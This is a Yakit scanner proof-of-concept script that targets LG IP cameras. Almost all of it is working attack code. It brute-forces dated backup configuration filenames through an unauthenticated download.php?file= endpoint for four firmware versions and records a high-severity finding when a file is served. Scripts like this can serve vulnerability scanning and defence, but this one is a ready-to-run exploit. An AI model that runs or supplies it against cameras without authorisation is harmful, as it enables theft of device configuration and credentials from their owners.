##server:lg
##type:poc
##params:root_url
##name:LG_IPC_backup_file_download_poc
##severity:high
##out_put:LG_IPC_backup_file_path


loglevel(`info`)
yakit.AutoInitYakit()

model_version_list = ["2219.0.0.1505220", "2745.0.0.1508190", "1954.0.0.1410150", "1030.0.0.1310250"]


brute=func(mv,url){
    log_date=""
    res=time.GetCurrentDate()[0]
    year=res.Year()-2000+1
    y_=""
    m_=""
    d_=""
    for y=20;y<year;y++{
        y_=string(y)
        // println(y_)
        for m=1;m<13;m++{
            if m<10{
                m_="0"+string(m)
            }else{
                m_=string(m)                
            }
            // println(m_)
            for d=1;d<32;d++{
                if d<10{
                    d_="0"+string(d)
                }else{
                    d_=string(d)
                }
                // println(d_)
                log_date=y_+m_+d_
                path=f"download.php?file=backup_${log_date}_${mv}.config"              
                http_rsp,err=http.Get(f"${url}/${path}")
                if err != nil {
                    die(err)
                }
                if http_rsp.StatusCode==200 && http_rsp.Header["Content-Length"]!="0"{
                    return f"${url}/${path}"
                }

            }            
        }    
    }
}

res_output=func(config_url){
    risk.NewRisk(
        root_url,
        risk.severity("high"), 
        risk.title(f"FOUND ${root_url} 存在LG_IPC备份文件下载漏洞"), 
        risk.titleVerbose("LG_IPC备份文件下载漏洞"), 
        risk.type("身份伪造"), 
        risk.typeVerbose("配置错误"),                 
        risk.details({"LG_IPC_backup_file_path":config_url}), 
    )  

}

poc=func(addr){
    isTls = str.IsTLSServer(addr)  
    url=""
    if isTls{
        url=f"https://${addr}"
    }else{
        url=f"http://${addr}"
    }
    for mv in model_version_list{
        config_url=brute(mv,url)
        if config_url!=""{
            res_output(config_url)
        }
    }      

}



root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}

addr = str.HostPort(ip, port)
poc(addr)
